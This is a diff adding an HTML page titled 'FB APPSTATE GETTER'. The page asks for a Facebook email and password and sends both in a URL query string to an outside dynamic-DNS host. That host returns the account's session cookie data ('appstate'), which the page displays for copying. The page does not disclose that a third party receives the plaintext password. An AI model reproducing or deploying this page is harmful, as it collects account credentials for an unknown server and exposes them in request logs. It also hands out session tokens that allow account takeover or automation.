@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Appstate Getter</title>
+  <link rel="icon" type="image/png" href="https://i.imgur.com/cyEbkbj.jpeg">
+  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0"></script>
+</head>
+<style>
+	body {
+  font-family: Arial, sans-serif;
+  background-image: url('https://i.ibb.co/QYPqXxF/0c9bbd541df8df697b8995deda24bcd1.gif'); 
+  background-size: cover;
+  background-repeat: no-repeat;
+  background-attachment: fixed;
+  padding: 24px;
+}
+
+.container {
+  background: white;
+  padding: 40px;
+  border: 3px solid blue;
+  border-radius: 10px;
+  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+  width: 100%;
+  max-width: 400px;
+  position: relative;
+  z-index: 2;
+  opacity: 0.6;
+  text-align: center;
+}
+
+h2, h3 {
+  text-align: center;
+}
+
+label {
+  display: block;
+  margin-top: 10px;
+  font-weight: bold;
+}
+
+input[type="email"],
+input[type="password"] {
+  width: 100%;
+  padding: 10px;
+  margin-top: 5px;
+  border: 3px solid lightblue;
+  border-radius: 7px;
+  box-sizing: border-box;
+}
+
+button[type="submit"],
+.copy-button {
+  width: 100%;
+  padding: 10px;
+  margin-top: 20px;
+  border: none;
+  background-color: green;
+  color: white;
+  font-size: 16px;
+  border-radius: 5px;
+  cursor: pointer;
+  
+}
+
+button[type="submit"]:hover,
+.copy-button:hover {
+  background-color: blue;
+}
+
+.hidden {
+  display: none;
+}
+
+.response-section {
+  margin-top: 20px;
+}
+
+.response-section.fade-in {
+  animation: fadeIn 0.5s;
+}
+
+pre {
+  background: white;
+  padding: 10px;
+  border-radius: 6px;
+  overflow-x: auto;
+}
+
+@keyframes fadeIn {
+  from {
+    opacity: 0;
+  }
+  to {
+    opacity: 1;
+  }
+}
+
+#particles-js {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  z-index: 0;
+}
+
+</style>
+<body>
+  <div id="particles-js"></div> 
+
+  <div class="container">
+    <form id="loginForm" class="login-form">
+      <h2>FB APPSTATE GETTER</h2>
+      <label for="contact">Email:</label>
+      <input type="email" id="contact" name="contact" required>
+      
+      <label for="password">Password:</label>
+      <input type="password" id="password" name="password" required>
+      
+      <button type="submit" id="submitButton">Submit</button>
+    </form>
+
+    <section id="responseSection" class="response-section hidden">
+      <h3>YOUR APPSTATE:</h3>
+      <pre id="responseMessage"></pre>
+      <button id="copyButton" class="copy-button">Copy to Clipboard</button>
+    </section>
+  </div>
+  <script>
+  	// Initialize particles.js
+particlesJS('particles-js', {
+  particles: {
+    number: {
+      value: 80,
+      density: {
+        enable: true,
+        value_area: 800
+      }
+    },
+    color: {
+      value: "#ffffff"
+    },
+    shape: {
+      type: "circle",
+      stroke: {
+        width: 0,
+        color: "#000000"
+      },
+      polygon: {
+        nb_sides: 5
+      }
+    },
+    opacity: {
+      value: 0.5,
+      random: true,
+      anim: {
+        enable: true,
+        speed: 1,
+        opacity_min: 0.1,
+        sync: false
+      }
+    },
+    size: {
+      value: 3,
+      random: true,
+      anim: {
+        enable: true,
+        speed: 40,
+        size_min: 0.1,
+        sync: false
+      }
+    },
+    line_linked: {
+      enable: true,
+      distance: 150,
+      color: "#ffffff",
+      opacity: 0.4,
+      width: 1
+    },
+    move: {
+      enable: true,
+      speed: 6,
+      direction: "none",
+      random: false,
+      straight: false,
+      out_mode: "out",
+      bounce: false,
+      attract: {
+        enable: false,
+        rotateX: 600,
+        rotateY: 1200
+      }
+    }
+  },
+  interactivity: {
+    detect_on: "canvas",
+    events: {
+      onhover: {
+        enable: true,
+        mode: "repulse"
+      },
+      onclick: {
+        enable: true,
+        mode: "push"
+      },
+      resize: true
+    },
+    modes: {
+      grab: {
+        distance: 400,
+        line_linked: {
+          opacity: 1
+        }
+      },
+      bubble: {
+        distance: 400,
+        size: 40,
+        duration: 2,
+        opacity: 8,
+        speed: 3
+      },
+      repulse: {
+        distance: 100,
+        duration: 0.4
+      },
+      push: {
+        particles_nb: 4
+      },
+      remove: {
+        particles_nb: 2
+      }
+    }
+  },
+  retina_detect: true
+});
+
+const loginForm = document.getElementById('loginForm');
+const responseSection = document.getElementById('responseSection');
+const responseMessage = document.getElementById('responseMessage');
+const copyButton = document.getElementById('copyButton');
+const submitButton = document.getElementById('submitButton');
+
+loginForm.addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const email = document.getElementById('contact').value;
+  const password = document.getElementById('password').value;
+
+  // Change button text to "Submitting, please wait..."
+  submitButton.textContent = "⌛ Submitting, please wait...";
+  submitButton.disabled = true;
+
+  responseSection.classList.add('hidden');
+
+  try {
+    const response = await fetch(`https://ccprojectapis.ddns.net/api/appstate?e=${encodeURIComponent(email)}&p=${encodeURIComponent(password)}`);
+    const data = await response.text();
+
+    let formattedResponse = data;
+
+    try {
+      const parsedData = JSON.parse(data);
+      formattedResponse = JSON.stringify(parsedData, null, 2);
+    } catch {}
+
+    responseMessage.textContent = formattedResponse;
+    responseSection.classList.remove('hidden');
+    responseSection.classList.add('fade-in');
+  } catch (error) {
+    alert('An error occurred while processing your request.');
+  } finally {
+    // Reset button to its original state
+    submitButton.textContent = "Submit";
+    submitButton.disabled = false;
+  }
+});
+
+copyButton.addEventListener('click', () => {
+  navigator.clipboard.writeText(responseMessage.textContent).then(() => {
+    alert('Copied to clipboard!');
+  });
+});
+
+</script>
+
+  <script src="script.js" defer></script>
+</body>
+
+</html>
